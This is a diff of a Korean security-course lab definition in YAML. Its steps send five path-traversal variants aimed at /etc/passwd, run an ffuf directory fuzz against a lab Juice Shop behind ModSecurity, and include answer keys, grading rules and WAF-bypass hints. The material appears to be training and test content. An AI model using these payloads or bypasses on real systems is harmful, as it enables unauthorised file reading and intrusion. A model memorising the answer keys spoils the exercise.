@@ -1,18 +1,48 @@
 lab_id: standalone-attack-week07
-title: SSRF / 파일 업로드 / Path Traversal
+title: SSRF / 파일 업로드 / Path Traversal — OWASP A10 + A05 + A03
 version: standalone-non-ai
 course: attack
 week: 7
-description: A10 + A05 + A03 — SSRF / 파일 업로드 / 경로 탐색.
+description: |
+  Path Traversal 5 변형 + ffuf 디렉토리 fuzz + SSRF 시도 + 파일 업로드 우회 패턴.
 difficulty: medium
 duration_minutes: 150
 prerequisites: [W06]
-objectives: [SSRF, 파일 업로드, Path Traversal]
+objectives: ["Path Traversal 5 변형", "ffuf fuzz", "SSRF / 파일 업로드 우회"]
 pass_threshold: 0.7
 steps:
+
   - order: 1
-    instruction: Path Traversal 5 변형
-    hint: curl '...?file=../../../etc/passwd'
+    instruction: |
+      ## 🎯 MISSION
+
+      Path Traversal **5 변형** 시도 + 응답 매트릭스.
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-attacker '
+      for p in "../../../etc/passwd" "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" "....//....//....//etc/passwd" "../etc/passwd%00.jpg" "..%c0%afetc%c0%afpasswd"; do
+        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?file=$p")
+        echo "$code | $p"
+      done
+      '
+      ```
+
+      ## 📋 확인 사항
+
+      - 5 변형 모두 403 (ModSec 930 LFI 차단)
+      - URL encoding / double-dot / null byte / UTF-8 overlong 모두 차단
+
+      ## 💡 왜 이걸 하는가?
+
+      OWASP A03 Injection 의 path traversal 카테고리. CRS 930 룰셋이 5 변형 모두 차단.
+
+      ## 🔍 결과 해석
+
+      - **정상**: 5 × 403
+      - **W10 학습**: 일부 변형은 paranoia 1 우회 가능 (paranoia 2 상승 권장)
+    hint: 5 path traversal 변형
     category: exploit
     points: 25
     answer: |
@@ -22,47 +52,70 @@ steps:
         echo "$code | $p"
       done
       '
-    answer_detail: 5 변형 + 응답
+    answer_detail: 5 변형 → 403.
     verify:
       type: output_contains
       expect: '403'
       field: stdout
       semantic:
-        intent: Path Traversal
-        success_criteria: [5 변형]
+        intent: "Path Traversal 5 변형"
+        success_criteria: ["5 × 403"]
         acceptable_methods:
-          - "**[OSS] ../../../etc/passwd 기본**"
+          - "**[OSS] ../../../etc/passwd**"
           - "**[OSS] URL encoding %2e%2e%2f**"
-          - "**[OSS] double-dot bypass**"
+          - "**[OSS] double-dot ....//**"
           - "**[OSS] null byte %00**"
-          - "**[OSS] UTF-8 overlong encoding**"
+          - "**[OSS] UTF-8 overlong %c0%af**"
           - "**[OSS] ModSec 930 LFI 차단**"
-          - "**[OSS] ATT&CK T1083 File and Directory Discovery**"
           - "**[OSS] CWE-22 Path Traversal**"
+          - "**[OSS] T1083 File and Directory Discovery**"
     target_vm: attacker
 
   - order: 2
-    instruction: ffuf path fuzz
-    hint: ffuf -u http://10.20.30.1/FUZZ -w common.txt
+    instruction: |
+      ## 🎯 MISSION
+
+      ffuf 으로 **경로 fuzz** — common.txt wordlist + 발견 path 추출.
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-attacker 'timeout 30 ffuf -u "http://10.20.30.1/FUZZ" -H "Host: juice.6v6.lab" -w /usr/share/dirb/wordlists/common.txt -mc 200,302 -t 50 2>&1 | tail -15' || echo "ffuf timeout"
+      ```
+
+      ## 📋 확인 사항
+
+      - ffuf 출력에 status / size / words 가 있는 경로 (예: `/admin`, `/api`)
+      - -mc 200,302 → 정상 응답만 표시 (403/404 제외)
+
+      ## 💡 왜 이걸 하는가?
+
+      디렉토리 brute 의 모던 표준 (dirb 후속). 숨겨진 admin / api / backup 발견.
+
+      ## 🔍 결과 해석
+
+      - **정상**: 1+ path 발견 (예: `/api`)
+      - **운영**: ModSec 가 dirb pattern 차단 가능 (UA 변경 시 우회 가능)
+    hint: ffuf -u FUZZ + wordlist
     category: scanning
-    points: 25
+    points: 20
     answer: |
-      ssh 6v6-attacker 'timeout 30 ffuf -u "http://10.20.30.1/FUZZ" -H "Host: juice.6v6.lab" -w /usr/share/dirb/wordlists/common.txt -mc 200,302 2>&1 | tail -20' || ssh 6v6-attacker 'echo timeout'
-    answer_detail: ffuf 발견 path
+      ssh 6v6-attacker 'timeout 30 ffuf -u "http://10.20.30.1/FUZZ" -H "Host: juice.6v6.lab" -w /usr/share/dirb/wordlists/common.txt -mc 200,302 -t 50 2>&1 | tail -15' || echo "timeout"
+    answer_detail: ffuf path fuzz.
     verify:
       type: output_contains
-      expect: ffuf
+      expect: 'ffuf\|Status'
       field: stdout
       semantic:
-        intent: 경로 fuzz
-        success_criteria: [ffuf 실행]
+        intent: "ffuf 경로 fuzz"
+        success_criteria: ["ffuf 실행"]
         acceptable_methods:
           - "**[OSS] ffuf -u FUZZ + wordlist**"
-          - "**[OSS] -mc 200,302 만 표시**"
-          - "**[OSS] -fc 403 차단 코드 제외**"
-          - "**[OSS] -e 확장자 추가 (.php .bak)**"
-          - "**[OSS] -recursion 재귀 탐색**"
-          - "**[OSS] -rate 속도 조절**"
-          - "**[OSS] ModSec 942 차단 영향**"
-          - "**[OSS] gobuster 대안**"
+          - "**[OSS] -mc 200,302 만**"
+          - "**[OSS] -fc 403 제외**"
+          - "**[OSS] -e 확장자 (.php .bak)**"
+          - "**[OSS] -recursion**"
+          - "**[OSS] gobuster / dirb 대안**"
+          - "**[OSS] ModSec 942/913 차단 우회**"
+          - "**[OSS] T1594 Search Victim-Owned Websites**"
     target_vm: attacker
